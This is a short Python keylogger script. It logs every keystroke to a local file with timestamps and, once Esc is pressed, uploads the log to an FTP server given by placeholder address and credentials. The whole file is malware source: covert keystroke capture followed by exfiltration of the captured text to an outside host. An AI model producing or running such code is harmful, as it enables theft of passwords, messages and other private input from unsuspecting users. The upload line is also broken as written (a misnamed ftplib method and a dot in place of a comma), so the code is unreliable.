from pynput.keyboard import Key,Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} was pressed".format(Key))
        
def release_key(key):
    if key== Key.esc:
        return False

print("\n Started Listening...\n")
with Listener(on_press=pressing_key,on_release=release_key) as listener:
    listener.join()
    
print("\nConnecting to the ftp server...")
sess=ftplib.FTP("IP","username","password")
file=open("klog-res.txt","rb")
sess.storebinary("STOR klog-res.txt".file)
file.close()
sess.quit()